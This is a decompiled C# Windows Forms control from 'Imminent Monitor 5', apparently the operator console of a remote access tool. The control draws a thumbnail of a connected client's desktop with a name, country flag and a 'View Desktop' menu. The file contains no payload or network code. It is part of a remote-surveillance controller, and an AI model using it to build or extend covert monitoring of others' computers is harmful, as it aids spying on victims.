// Decompiled with JetBrains decompiler
// Type: UserControlThumbnail
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlThumbnail : UserControl
{
  private IContainer icontainer_0;
  private Label label_0;
  private PictureBox pictureBox_0;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private PictureBox pictureBox_1;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private GClass18 gclass18_0;

  public UserControlThumbnail(GClass18 gclass18_1)
  {
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    Class97.smethod_12((UserControl) this);
    this.vmethod_0().Text = string.Format("{0}/{1}", (object) this.gclass18_0.method_20().string_2, (object) this.gclass18_0.method_20().string_1);
    this.vmethod_8().Image = Class97.formMain_0.vmethod_0().vmethod_38().Images[Class97.formMain_0.vmethod_0().method_49(this.gclass18_0.method_20().string_7)];
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    this.vmethod_1(new Label());
    this.vmethod_3(new PictureBox());
    this.vmethod_5(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_7(new ToolStripMenuItem());
    this.vmethod_11(new ToolStripSeparator());
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_9(new PictureBox());
    ((ISupportInitialize) this.vmethod_2()).BeginInit();
    this.vmethod_4().SuspendLayout();
    ((ISupportInitialize) this.vmethod_8()).BeginInit();
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_0().AutoSize = true;
    Label label1 = this.vmethod_0();
    Point point1 = new Point(21, 132);
    Point point2 = point1;
    label1.Location = point2;
    this.vmethod_0().Name = "LabelName";
    Label label2 = this.vmethod_0();
    Size size1 = new Size(19, 13);
    Size size2 = size1;
    label2.Size = size2;
    this.vmethod_0().TabIndex = 0;
    this.vmethod_0().Text = "{0}";
    this.vmethod_2().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_2().BorderStyle = BorderStyle.FixedSingle;
    this.vmethod_2().ContextMenuStrip = this.vmethod_4();
    PictureBox pictureBox1 = this.vmethod_2();
    point1 = new Point(3, 3);
    Point point3 = point1;
    pictureBox1.Location = point3;
    this.vmethod_2().Name = "PictureBoxThumbnail";
    PictureBox pictureBox2 = this.vmethod_2();
    size1 = new Size(204, 124);
    Size size3 = size1;
    pictureBox2.Size = size3;
    this.vmethod_2().SizeMode = PictureBoxSizeMode.StretchImage;
    this.vmethod_2().TabIndex = 1;
    this.vmethod_2().TabStop = false;
    this.vmethod_4().Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_6(),
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_12()
    });
    this.vmethod_4().Name = "ContextMenuStripThumbnail";
    ContextMenuStrip contextMenuStrip = this.vmethod_4();
    size1 = new Size(197, 54);
    Size size4 = size1;
    contextMenuStrip.Size = size4;
    this.vmethod_6().Image = (Image) Class145.smethod_62();
    this.vmethod_6().Name = "ViewDesktopToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_6();
    size1 = new Size(196, 22);
    Size size5 = size1;
    toolStripMenuItem1.Size = size5;
    this.vmethod_6().Text = "View Desktop";
    this.vmethod_10().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator = this.vmethod_10();
    size1 = new Size(193, 6);
    Size size6 = size1;
    toolStripSeparator.Size = size6;
    this.vmethod_12().Image = (Image) Class145.smethod_48();
    this.vmethod_12().Name = "SelectMainClientItemToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_12();
    size1 = new Size(196, 22);
    Size size7 = size1;
    toolStripMenuItem2.Size = size7;
    this.vmethod_12().Text = "Select Main Client Item";
    this.vmethod_12().ToolTipText = "Selects the client in the main \"clients tab\"";
    this.vmethod_8().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    PictureBox pictureBox3 = this.vmethod_8();
    point1 = new Point(3, 130);
    Point point4 = point1;
    pictureBox3.Location = point4;
    this.vmethod_8().Name = "PictureBoxCountry";
    PictureBox pictureBox4 = this.vmethod_8();
    size1 = new Size(16, 16);
    Size size8 = size1;
    pictureBox4.Size = size8;
    this.vmethod_8().TabIndex = 6;
    this.vmethod_8().TabStop = false;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.Controls.Add((Control) this.vmethod_8());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlThumbnail);
    size1 = new Size(210, 149);
    this.Size = size1;
    ((ISupportInitialize) this.vmethod_2()).EndInit();
    this.vmethod_4().ResumeLayout(false);
    ((ISupportInitialize) this.vmethod_8()).EndInit();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual Label vmethod_0() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(Label label_1) => this.label_0 = label_1;

  internal virtual PictureBox vmethod_2() => this.pictureBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(PictureBox pictureBox_2) => this.pictureBox_0 = pictureBox_2;

  internal virtual ContextMenuStrip vmethod_4() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_6() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_3);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual PictureBox vmethod_8() => this.pictureBox_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(PictureBox pictureBox_2) => this.pictureBox_1 = pictureBox_2;

  internal virtual ToolStripSeparator vmethod_10() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  private void method_0(object sender, EventArgs e)
  {
    this.method_1(0);
    Class97.formMain_0.vmethod_0().vmethod_108().Items[this.gclass18_0.method_20().listViewItem_4.Index].Selected = true;
    Class97.formMain_0.vmethod_0().vmethod_108().Items[this.gclass18_0.method_20().listViewItem_4.Index].EnsureVisible();
  }

  private void method_1(int int_0)
  {
    this.method_2();
    Class97.formMain_0.vmethod_2().Show();
    Class97.formMain_0.vmethod_2().SelectedIndex = int_0;
    Class97.smethod_20(Class97.formMain_0.vmethod_58(), "$('.page').empty();");
    Class97.formMain_0.vmethod_2().Focus();
  }

  public void method_2()
  {
    Class97.formMain_0.vmethod_2().Hide();
    Class97.formMain_0.vmethod_8().Hide();
    Class97.formMain_0.vmethod_54().Hide();
  }

  private void method_3(object sender, EventArgs e)
  {
    if (!this.method_4((Form) this.gclass18_0.method_20().formDesktop_0))
    {
      FormDesktop formDesktop = new FormDesktop(this.gclass18_0);
      formDesktop.Show();
      this.gclass18_0.method_20().formDesktop_0 = formDesktop;
    }
    else
      this.method_5((Form) this.gclass18_0.method_20().formDesktop_0);
  }

  public bool method_4(Form form_0) => form_0 != null && !form_0.IsDisposed;

  public void method_5(Form form_0)
  {
    if (form_0.WindowState == FormWindowState.Minimized)
      form_0.WindowState = FormWindowState.Normal;
    form_0.BringToFront();
  }
}
